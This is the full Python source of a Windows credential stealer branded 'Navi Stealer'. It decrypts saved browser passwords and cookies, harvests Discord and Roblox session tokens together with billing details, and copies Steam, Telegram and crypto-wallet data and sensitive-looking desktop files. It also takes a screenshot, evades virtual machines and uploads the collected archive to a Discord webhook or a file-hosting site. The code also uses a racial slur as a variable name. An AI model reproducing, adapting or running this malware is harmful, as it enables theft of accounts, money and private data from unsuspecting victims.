import os, sys, json, re, shutil, sqlite3, zipfile, subprocess, threading, platform, base64, socket, uuid, ctypes, traceback
from datetime import datetime, timezone
try: 
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-q"])
    import requests
try: 
    import win32crypt
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32", "-q"])
    import win32crypt

# CONFIG
_SET = {
    "target": "discord",
    "token": "",
    "id": "",
    "hook": "{{WEBHOOK}}",
    "dbg": False,
    "files": False,
    "secure": False,
    "ping": False
}


def fetch_roblox_sex(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
    try:
        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
        if user_res.status_code != 200:
            return None
        user_data = user_res.json()
        user_id = user_data["id"]
        username = user_data["name"]
        display_name = user_data.get("displayName", "N/A")
        robux_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=10)
        robux = robux_res.json().get("robux", 0) if robux_res.status_code == 200 else 0
        prem_res = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers=headers, timeout=10)
        is_premium = prem_res.json() if prem_res.status_code == 200 else False
        thumb_res = requests.get(
            f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png",
            headers=headers, timeout=10
        )
        avatar_url = ""
        if thumb_res.status_code == 200:
            thumb_data = thumb_res.json()
            if thumb_data.get("data"):
                avatar_url = thumb_data["data"][0].get("imageUrl", "")
        return {
            "id": user_id,
            "name": username,
            "display_name": display_name,
            "robux": robux,
            "premium": is_premium,
            "profile_url": f"https://www.roblox.com/users/{user_id}/profile",
            "avatar_url": avatar_url
        }
    except Exception:
        return None

def roblox_sex():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    if not os.path.exists(roblox_cookies_path):
        print("[!] Roblox cookie file not found.")
        return
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)
    decrypted_cookie = None
    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            try:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                if encoded_cookies:
                    decoded_cookies = base64.b64decode(encoded_cookies)
                    try:
                        decrypted_bytes = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                        decrypted_cookie = decrypted_bytes.decode('utf-8', errors='ignore')
                        print("[+] Decryption successful.")
                    except Exception as e:
                        print(f"[!]")
                else:
                    print("[!]")
            except json.JSONDecodeError as e:
                print(f"[!]")
    except Exception as e:
        print(f"[!]")
    finally:
        if os.path.exists(destination_path):
            try:
                os.remove(destination_path)
            except Exception:
                pass

    if decrypted_cookie:
        match = re.search(r'(_\|WARNING:.*?);', decrypted_cookie)
        if match:
            token = match.group(1)
            info = fetch_roblox_sex(token)
            if info:
                color = 0x00A3FF
                fields = [
                    {"name": "Username:", "value": f"[{info['name']}]({info['profile_url']})", "inline": True},
                    {"name": "Display Name:", "value": info["display_name"], "inline": True},
                    {"name": "User ID:", "value": str(info["id"]), "inline": True},
                    {"name": "<:7116_Robux:1509632493106499624> Robux:", "value": f"{info['robux']} R$", "inline": True},
                    {"name": "<:2978robloxlogo:1509632404665401506> Premium:", "value": "✅ Yes" if info["premium"] else "❌ No", "inline": True},
                    {"name": "Target PC:", "value": f"{os.getenv('COMPUTERNAME')}\\{os.getenv('USERNAME')}", "inline": True}
                ]
                chunk_size = 1000
                if len(token) > chunk_size:
                    chunks = [token[i:i+chunk_size] for i in range(0, len(token), chunk_size)]
                    for idx, chunk in enumerate(chunks):
                        fields.append({"name": f"Token Part {idx+1}/{len(chunks)}", "value": f"```\n{chunk}\n```", "inline": False})
                else:
                    fields.append({"name": "Token", "value": f"```\n{token}\n```", "inline": False})
                gh = "https://github.com/glockinhand"
                payload = {
                    "embeds": [{
                        "username": "Navi Stealer",
                        "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png",
                        "title": "<:2978robloxlogo:1509632404665401506> Roblox Account Captured",
                        "color": color,
                        "thumbnail": {"url": info["avatar_url"]},
                        "fields": fields,
                        "footer": {"text": f"Navi Multitool | {gh}"}
                    }]
                }
                try:
                    requests.post(_SET["hook"], json=payload, timeout=10)
                except Exception as e:
                    print(f"[!]")
            else:
                print("[!]")
        else:
            print("[!]")
    else:
        print("[!]")

class NaviRecovery:
    def __init__(self):
        self.res = []
        self._log("Initializing Navi...")
        self.user = os.getlogin()
        self.tmp = os.path.join(os.getenv("TEMP"), f"n_{uuid.uuid4().hex[:6]}")
        if not os.path.exists(self.tmp): os.makedirs(self.tmp)
        self.app = os.getenv("AppData")
        self.loc = os.getenv("LocalAppData")
        self.sys_info = {"OS":"Unknown", "User":self.user, "PC":socket.gethostname(), "IP":"N/A", "CPU":"N/A", "GPU":"N/A", "RAM":"N/A"}
        self.tokens = []
        self.totals = {"pass":0, "cook":0, "hist":0, "auto":0, "disc":0, "game":[], "file":0, "wall":0}
        
        self.browsers = {
            "chrome": self.loc + "\\Google\\Chrome\\User Data",
            "edge": self.loc + "\\Microsoft\\Edge\\User Data",
            "brave": self.loc + "\\BraveSoftware\\Brave-Browser\\User Data",
            "opera": self.app + "\\Opera Software\\Opera Stable",
            "opera_gx": self.app + "\\Opera Software\\Opera GX Stable",
            "yandex": self.loc + "\\Yandex\\YandexBrowser\\User Data"
        }

    def _log(self, m):
        if _SET["dbg"]: print(f"  [*] {m}")
        self.res.append(m)

    def _copy(self, s, d):
        try: shutil.copy2(s, d)
        except: pass

    def sec_chk(self):
        if not _SET["secure"]: return
        self._log("Running Security Check...")
        _drivers = ["Vmmouse.sys", "Vboxguest.sys", "vmsrvc.sys", "vmmemctl.sys"]
        for d in _drivers:
            if os.path.exists(f"C:\\Windows\\System32\\drivers\\{d}"): 
                self._log("VM Driver detected. Exiting.")
                sys.exit(0)
        try:
            o = subprocess.check_output("tasklist", shell=True).decode()
            if len(o.splitlines()) < 45: 
                self._log("Low task count. Exiting.")
                sys.exit(0)
        except: pass

    def get_sys(self):
        try:
            self._log("Gathering system information...")
            try: self.sys_info["IP"] = requests.get("https://api.ipify.org", timeout=5).text
            except: pass
            self.sys_info["OS"] = f"{platform.system()} {platform.release()} ({platform.architecture()[0]})"
            self.sys_info["CPU"] = platform.processor()
            try:
                g = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode().splitlines()
                if len(g) > 1: self.sys_info["GPU"] = g[1].strip()
            except: pass
            try:
                r = subprocess.check_output("wmic computersystem get totalphysicalmemory", shell=True).decode().splitlines()
                if len(r) > 1: 
                    m = re.findall(r'\d+', r[1])
                    if m: self.sys_info["RAM"] = f"{round(int(m[0]) / (1024**3))} GB"
            except: pass
        except: pass

    def take_ss(self):
        try:
            self._log("Capturing screenshot...")
            from PIL import ImageGrab
            ss = ImageGrab.grab()
            ss.save(os.path.join(self.tmp, "screenshot.png"))
        except:
            try:
                ps = "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -m 500; $img = [System.Windows.Forms.Clipboard]::GetImage(); $img.Save('" + os.path.join(self.tmp, "screenshot.png") + "', [System.Drawing.Imaging.ImageFormat]::Png)"
                subprocess.run(["powershell", "-Command", ps], capture_output=True)
            except: pass

    def brow_pget(self):
        try:
            self._log("Extracting browser data...")
            try:
                from Crypto.Cipher import AES; from win32crypt import CryptUnprotectData
            except: 
                self._log("Missing Crypto/Win32 dependencies")
                return
            
            _p, _c, _h, _a = "", "", "", ""
            for n, p in self.browsers.items():
                _ls = os.path.join(p, "Local State")
                if not os.path.exists(_ls): continue
                try:
                    with open(_ls, "r", encoding="utf-8") as f:
                        _k = json.load(f)["os_crypt"]["encrypted_key"]
                        _mk = CryptUnprotectData(base64.b64decode(_k)[5:], None, None, None, 0)[1]
                except: continue
                
                for pr in ["Default", "Profile 1", "Profile 2", "Profile 3", "Guest"]:
                    _pp = os.path.join(p, pr)
                    if not os.path.exists(_pp): continue
                    
                    for _f in [("Login Data", "logins", "action_url, username_value, password_value"), 
                            ("Cookies", "cookies", "host_key, name, encrypted_value"),
                            ("History", "urls", "url, title, visit_count"),
                            ("Web Data", "autofill", "name, value")]:
                        _db = os.path.join(_pp, _f[0])
                        if not os.path.exists(_db): continue
                        _t = os.path.join(self.tmp, f"t_{uuid.uuid4().hex[:4]}.db")
                        self._copy(_db, _t)
                        try:
                            conn = sqlite3.connect(_t); cur = conn.cursor()
                            cur.execute(f"SELECT {_f[2]} FROM {_f[1]}")
                            for r in cur.fetchall():
                                try:
                                    if _f[0] == "Login Data":
                                        iv, pl = r[2][3:15], r[2][15:]
                                        dec = AES.new(_mk, AES.MODE_GCM, iv).decrypt(pl)[:-16].decode()
                                        _p += f"U: {r[0]}\nL: {r[1]} | P: {dec}\n\n"; self.totals["pass"] += 1
                                    elif _f[0] == "Cookies":
                                        try:
                                            iv, pl = r[2][3:15], r[2][15:]
                                            dec = AES.new(_mk, AES.MODE_GCM, iv).decrypt(pl)[:-16].decode()
                                            _c += f"{r[0]}\tTRUE\t/\tFALSE\t2597573456\t{r[1]}\t{dec}\n"; self.totals["cook"] += 1
                                        except: pass
                                    elif _f[0] == "History": _h += f"URL: {r[0]}\nTitle: {r[1]} | Visits: {r[2]}\n\n"; self.totals["hist"] += 1
                                    elif _f[0] == "Web Data": _a += f"Name: {r[0]} | Value: {r[1]}\n"; self.totals["auto"] += 1
                                except: pass
                            conn.close(); os.remove(_t)
                        except: pass
            
            if _p: open(os.path.join(self.tmp, "passwords.txt"), "w", encoding="utf-8").write(_p)
            if _c: open(os.path.join(self.tmp, "cookies.txt"), "w", encoding="utf-8").write(_c)
            if _h: open(os.path.join(self.tmp, "history.txt"), "w", encoding="utf-8").write(_h)
            if _a: open(os.path.join(self.tmp, "autofill.txt"), "w", encoding="utf-8").write(_a)
        except: pass

    def disc_tget(self):
        try:
            self._log("Extracting Discord tokens...")
            try: from Crypto.Cipher import AES; from win32crypt import CryptUnprotectData
            except: return
            
            _tks = []
            _ps = {
                "Discord": self.app + "\\Discord",
                "Canary": self.app + "\\discordcanary",
                "PTB": self.app + "\\discordptb",
                "Lightcord": self.app + "\\Lightcord",
                "Chrome": self.loc + "\\Google\\Chrome\\User Data",
                "Brave": self.loc + "\\BraveSoftware\\Brave-Browser\\User Data",
                "Edge": self.loc + "\\Microsoft\\Edge\\User Data"
            }
            for n, p in _ps.items():
                niggers = ["discord", "canary", "ptb", "lightcord"]
                _bases = [p] if any(name in n.lower() for name in niggers) else [os.path.join(p, pr) for pr in ["Default", "Profile 1", "Profile 2", "Profile 3", "Guest"]]
                _mk = None
                _ls = os.path.join(p, "Local State")
                if os.path.exists(_ls):
                    try:
                        with open(_ls, "r", encoding="utf-8") as f:
                            _k = json.load(f)["os_crypt"]["encrypted_key"]
                            _mk = CryptUnprotectData(base64.b64decode(_k)[5:], None, None, None, 0)[1]
                    except: pass
                
                for b in _bases:
                    _ld = os.path.join(b, "Local Storage", "leveldb")
                    if not os.path.exists(_ld): continue
                    for f in os.listdir(_ld):
                        if f.endswith(".log") or f.endswith(".ldb"):
                            try:
                                with open(os.path.join(_ld, f), "rb") as h:
                                    _content = h.read().decode(errors="ignore")
                                    for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", _content):
                                        if t not in _tks: _tks.append(t)
                                    if _mk:
                                        for t in re.findall(r"dQw4w9WgXcQ:([^\"]*)", _content):
                                            try:
                                                _enc = base64.b64decode(t)
                                                iv, pl = _enc[3:15], _enc[15:]
                                                _dec = AES.new(_mk, AES.MODE_GCM, iv).decrypt(pl)[:-16].decode()
                                                if _dec not in _tks: _tks.append(_dec)
                                            except: pass
                            except: pass
            
            _res = ""
            for t in _tks:
                h = {"Authorization": t, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"}
                try:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=5)
                    if r.status_code == 200:
                        j = r.json()
                        un = f"{j['username']}"
                        uid = j['id']
                        em = j.get('email', 'N/A')
                        ph = j.get('phone', 'N/A')
                        nit = "None"
                        nt = j.get("premium_type", 0)
                        if nt == 1: nit = "<:classic:896119171019067423> Nitro Classic"
                        elif nt == 2: nit = "<a:126620nitro:1505904077668749392> Nitro Boost"
                        bill = "None"
                        try:
                            br = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=h, timeout=5)
                            if br.status_code == 200:
                                bj = br.json()
                                if len(bj) > 0:
                                    bill = ""
                                    for b in bj:
                                        if b['type'] == 1: bill += "<a:6337creditcard:1505905221908566016> Card "
                                        elif b['type'] == 2: bill += "<a:771036paypal:1505905194506911805> PayPal "
                        except: pass
                        _res += f"Token: {t}\nUser: {un} ({uid})\nEmail: {em}\nPhone: {ph}\nNitro: {nit}\nBilling: {bill}\n\n"
                        if not any(x['t'] == t for x in self.tokens):
                            self.tokens.append({"u": un, "id": uid, "e": em, "p": ph, "t": t, "n": nit, "b": bill})
                            self.totals["disc"] += 1
                except: pass
            if _res: open(os.path.join(self.tmp, "discord_tokens.txt"), "w", encoding="utf-8").write(_res)
            self._log(f"Discord Tokens Found: {len(self.tokens)}")
        except Exception as e: self._log(f"Discord Token Error: {e}")

    def game_rec(self):
        try:
            self._log("Checking for Game Data...")
            mc = os.path.join(self.app, ".minecraft")
            if os.path.exists(mc):
                _dst = os.path.join(self.tmp, "Games", "Minecraft")
                if not os.path.exists(_dst): os.makedirs(_dst)
                for f in ["launcher_profiles.json", "launcher_accounts.json", "launcher_msa_credentials.bin"]:
                    if os.path.exists(os.path.join(mc, f)): self._copy(os.path.join(mc, f), os.path.join(_dst, f))
                self.totals["game"].append("Minecraft")
            
            st = "C:\\Program Files (x86)\\Steam"
            if os.path.exists(st):
                _dst = os.path.join(self.tmp, "Games", "Steam")
                if not os.path.exists(_dst): os.makedirs(_dst)
                sc = os.path.join(st, "config")
                if os.path.exists(sc):
                    for f in ["loginusers.vdf", "config.vdf"]:
                        if os.path.exists(os.path.join(sc, f)): self._copy(os.path.join(sc, f), os.path.join(_dst, f))
                for f in os.listdir(st):
                    if f.startswith("ssfn"): self._copy(os.path.join(st, f), os.path.join(_dst, f))
                self.totals["game"].append("Steam")
        except: pass

    def tele_rec(self):
        try:
            self._log("Checking for Telegram Data...")
            td = os.path.join(self.app, "Telegram Desktop", "tdata")
            if os.path.exists(td):
                _dst = os.path.join(self.tmp, "Telegram")
                if not os.path.exists(_dst): os.makedirs(_dst)
                for f in os.listdir(td):
                    if f in ["key_datas", "settingss"]: 
                        self._copy(os.path.join(td, f), os.path.join(_dst, f))
                    elif len(f) == 16 and os.path.isdir(os.path.join(td, f)):
                        _sd = os.path.join(_dst, f)
                        if not os.path.exists(_sd): os.makedirs(_sd)
                        for sf in os.listdir(os.path.join(td, f)):
                            if sf.startswith("map"): self._copy(os.path.join(td, f, sf), os.path.join(_sd, sf))
                self.totals["game"].append("Telegram")
        except: pass

    def wall_rec(self):
        try:
            self._wallets_found = 0
            self._log("Recovering Crypto Wallets...")
            browser_paths = {
                "Chrome": self.loc + "\\Google\\Chrome\\User Data",
                "Edge": self.loc + "\\Microsoft\\Edge\\User Data",
                "Opera": self.loc + "\\Opera Software\\Opera Stable",
                "OperaGX": self.loc + "\\Opera Software\\Opera GX Stable",
                "Vivaldi": self.loc + "\\Vivaldi\\User Data",
                "Brave": self.loc + "\\BraveSoftware\\Brave-Browser\\User Data",
                "Yandex": self.loc + "\\Yandex\\YandexBrowser\\User Data"
            }


            wallet_extensions = {
                "nkbihfbeogaeaoehlefnkodbefgpgknn": "Metamask",
                "ejbalbakoplchlghecdalmeeeajnimhm": "Metamask_alt",
                "fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
                "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
                "fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin",
                "ibnejdfjmmkpcnlpebklmnkoeoihofec": "Tron",
                "ejjladinnckdgjemekebdpeokbikhfci": "Petra",
                "efbglgofoippbgcjepnhiblaibcnclgk": "Martian",
                "phkbamefinggmakgklpkljjmgibohnba": "Pontem",
                "ebfidpplhabeedpnhjnobghokpiioolj": "Fewcha",
                "afbcbjpbpfadlkmhmclhkeeodmamcflc": "Math",
                "aeachknmefphepccionboohckonoeemg": "Coin98",
                "bhghoamapcdpbohphigoooaddinpkbai": "Authenticator",
                "aholpfdialjgjfhomihkjbmgjidlcdno": "ExodusWeb3",
                "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
                "agoakfejjabomempkjlepdflaleeobhb": "Core",
                "mfgccjchihfkkindfppnaooecgfneiii": "Tokenpocket",
                "lgmpcpglpngdoalbgeoldeajfclnhafa": "Safepal",
                "bhhhlbepdkbapadjdnnojkbgioiodbic": "Solfare",
                "jblndlipeogpafnldhgmapagcccfchpi": "Kaikas",
                "kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
                "ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
                "hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
                "cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx Liberty",
                "amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
                "fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
                "nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MEWCX",
                "nanjmdknhkinifnkgdcggcfnhdaammmj": "Guild",
                "nkddgncdjgjfcddamfgcmfnlhccnimig": "Saturn",
                "aiifbnbfobpmeekipheeijimdpnlpgpp": "TerraStation",
                "fnnegphlobjdpkhecapkijjdkgcjhkib": "HarmonyOutdated",
                "cgeeodpfagjceefieflmdfphplkenlfk": "Ever",
                "pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain",
                "mgffkfbidihjpoaomajlbgchddlicgpn": "PaliWallet",
                "aodkkagnadcbobfpggfnjeongemjbjca": "BoltX",
                "kpfopkelmapcoipemfendmdcghnegimn": "Liquality",
                "hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
                "lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
                "dngmlblcodfobpdpecaadgfbcggfjfnm": "MaiarDEFI",
                "ookjlbkiijinhpmnjffcofjonbfbgaoc": "TempleTezos",
                "eigblbgjknlfbajkfhopmcojidlgcehm": "XMR_PT"
            }

            desktop_wallets = {
                "Zonas": self.app + "\\Zonas",
                "Atomic": self.app + "\\atomic\\Local Storage\\leveldb",
                "Exodus": self.app + "\\Exodus\\exodus.wallet",
                "Binance": self.app + "\\Binance",
                "Coinbase": self.app + "\\Coinbase"
            }

            _found = 0

            for name, path in desktop_wallets.items():
                if os.path.exists(path):
                    _dst = os.path.join(self.tmp, "Wallets", name)
                    if not os.path.exists(_dst): os.makedirs(_dst)
                    if os.path.isfile(path): 
                        self._copy(path, _dst)
                    else:
                        for r, d, fs in os.walk(path):
                            for f in fs: 
                                self._copy(os.path.join(r, f), os.path.join(_dst, f))
                    _found += 1

            for browser_name, browser_path in browser_paths.items():
                if not os.path.exists(browser_path):
                    continue

                default_profile = os.path.join(browser_path, "Default")
                if os.path.exists(default_profile):
                    self._search_browser_extensions(default_profile, browser_name, wallet_extensions)

                profiles_path = os.path.join(browser_path)
                if os.path.exists(profiles_path):
                    for item in os.listdir(profiles_path):
                        if os.path.isdir(os.path.join(profiles_path, item)) and item.startswith("Profile "):
                            profile_path = os.path.join(profiles_path, item)
                            self._search_browser_extensions(profile_path, browser_name, wallet_extensions)

            self.totals["wall"] = _found + self._wallets_found
        except Exception as e:
            self._log(f"Error in wall_rec: {str(e)}")
            
    def _search_browser_extensions(self, profile_path, browser_name, wallet_extensions):
        extensions_path = os.path.join(profile_path, "Local Extension Settings")
        if not os.path.exists(extensions_path):
            return

        for ext_id, wallet_name in wallet_extensions.items():
            ext_path = os.path.join(extensions_path, ext_id)
            if os.path.exists(ext_path):
                _dst = os.path.join(self.tmp, "Wallets", f"{browser_name}_{wallet_name}")
                if not os.path.exists(_dst): os.makedirs(_dst)

                for r, d, fs in os.walk(ext_path):
                    for f in fs: 
                        self._copy(os.path.join(r, f), os.path.join(_dst, f))

                self._log(f"Found {wallet_name} extension in {browser_name}")
                self._wallets_found += 1


    def file_fnd(self):
        try:
            self._log("Searching for Sensitive Files...")
            if not _SET["files"]: return
            _kw = ["passw", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "prive", "telegram", "identifiant", "trading", "bitcoin", "funds", "note"]
            _c = 0; _sr = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            _dst = os.path.join(self.tmp, "Sensitive_Files")
            if not os.path.exists(_dst): os.makedirs(_dst)
            for r, d, fs in os.walk(_sr):
                for f in fs:
                    if any(k in f.lower() for k in _kw) and f.endswith((".txt", ".pdf", ".doc", ".docx")):
                        if os.path.getsize(os.path.join(r, f)) < 2 * 1024 * 1024:
                            self._copy(os.path.join(r, f), os.path.join(_dst, f)); _c += 1
            self.totals["file"] = _c
        except: pass

    def rep_send(self):
        try:
            self._log("Creating ZIP archive...")
            _zn = f"Navi_Report_{self.user}.zip"; _zp = os.path.join(os.getenv("TEMP"), _zn)
            with zipfile.ZipFile(_zp, 'w') as zf:
                for r, d, fs in os.walk(self.tmp):
                    for f in fs: zf.write(os.path.join(r, f), os.path.relpath(os.path.join(r, f), self.tmp))
            
            self._log("Uploading report...")
            gh = "https://github.com/glockinhand"
            from json import loads
            from urllib.request import Request, urlopen
            _st = f"🔑 **Passwords:** `{self.totals['pass']}`\n🍪 **Cookies:** `{self.totals['cook']}`\n📜 **History:** `{self.totals['hist']}`\n📝 **Autofill:** `{self.totals['auto']}`\n<:discordroundcoloricon:1505919320926978199> **Discord:** `{self.totals['disc']}`\n📂 **Files:** `{self.totals['file']}`\n<:1425bitcoin:1505919497356185730> **Wallets:** `{self.totals['wall']}`"
            if self.totals["game"]: _st += f"\n🎮 **Games:** `{', '.join(self.totals['game'])}`"
            _fields = [{"name": "<:2899info:1505918643433635850> User Info", "value": f"```Host: {self.sys_info.get('PC')}\nUser: {self.sys_info.get('User')}\nIP: {self.sys_info.get('IP')}```", "inline": True}, {"name": "💻 System", "value": f"```OS: {self.sys_info.get('OS')}\nRAM: {self.sys_info.get('RAM')}\nGPU: {self.sys_info.get('GPU')}```", "inline": True}, {"name": "📊 Stats", "value": _st, "inline": False}]
            _main_emb = {"title": "<a:12705eyes:1505917648507109508> Navi Stealer Report", "url": gh, "color": 0x00A3FF, "thumbnail": {"url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}, "fields": _fields, "footer": {"text": f"Navi Multitool | {gh}", "icon_url": "https://i.ibb.co/Wv94YGVx/navi.png"}, "timestamp": datetime.now(timezone.utc).isoformat()}
            _embeds = [_main_emb]
            for t in self.tokens[:9]:
                h = {"Authorization": t["t"], "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"}
                r = requests.get("https://discord.com/api/v10/users/@me", headers=h)
                userjson = r.json()
                pic = userjson.get("avatar")
                uid = userjson.get("id")
                pfp = f"https://cdn.discordapp.com/avatars/{uid}/{pic}" if pic is not None else "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
                _embeds.append({"title": f"<a:12705eyes:1505917648507109508> Token Info: {t['u']}", "color": 0x00A3FF, "thumbnail": {"url": pfp}, "fields": [{"name": ":id: ID:", "value": f"`{t['id']}`", "inline": True}, {"name": "<a:Invite9:1505916245445312592> Email:", "value": f"`{t['e']}`", "inline": True}, {"name": "📱 Phone:", "value": f"`{t['p']}`", "inline": True}, {"name": "<a:50534diamond:1505916198850658376> Nitro:", "value": t['n'], "inline": False}, {"name": "<a:Ver_money83:1505916176776171591> Billing:", "value": t['b'], "inline": False}, {"name": "<a:Rocket:1505916279477768203> Token:", "value": f"``` {t['t']} ```", "inline": False}]})
            _pj = {"content": "@everyone" if _SET["ping"] else "", "embeds": _embeds, "username": "Navi Stealer", "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}
            
            if os.path.getsize(_zp) > 8 * 1024 * 1024:
                try:
                    with open(_zp, "rb") as f:
                        r = requests.post(
                            "https://tmpfiles.org/api/v1/upload",
                            files={"file": f},
                            timeout=120
                        )
                    if r.status_code == 200:
                        _data = r.json()
                        if _data.get("status") == "success":
                            _url = _data["data"]["url"].replace("tmpfiles.org/", "tmpfiles.org/dl/")
                            print(f"[ZIP UPLOAD] Success: {_url}")
                            _main_emb["description"] = f"⚠️ **ZIP too large!** Download here: [Click Me]({_url})"
                            requests.post(_SET["hook"], json=_pj)
                        else:
                            print(f"[ZIP UPLOAD] API Error: {r.text[:200]}")
                    else:
                        print(f"[ZIP UPLOAD] Failed — response: {r.status_code} - {r.text[:200]}")
                except Exception as e:
                    print(f"[ZIP UPLOAD] Exception: {e}")

            else:
                try:
                    with open(_zp, "rb") as f:
                        r = requests.post(
                            _SET["hook"],
                            data={"payload_json": json.dumps(_pj)},
                            files={"file": f},
                            timeout=30
                        )

                    print(f"[UPLOAD] {r.status_code}")
                    print(r.text)
                    input()

                except Exception as e:
                    print(f"[UPLOAD ERROR] {repr(e)}")
                    input()
        except Exception as e:
            traceback.print_exc()
            input()

    def run(self):
        try:
            self.sec_chk()
            for p in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe"]: os.system(f"taskkill /F /IM {p} /T >nul 2>&1")
            _ts = [self.get_sys, self.take_ss, self.brow_pget, self.disc_tget, self.game_rec, self.tele_rec, self.wall_rec, self.file_fnd]
            _threads = []
            for _t in _ts:
                x = threading.Thread(target=_t); x.daemon = True; x.start(); _threads.append(x)
            for x in _threads: x.join(timeout=30)
            self.rep_send()
        except: pass

if __name__ == "__main__":
    try:
        NaviRecovery().run()
        roblox_sex()
    except: pass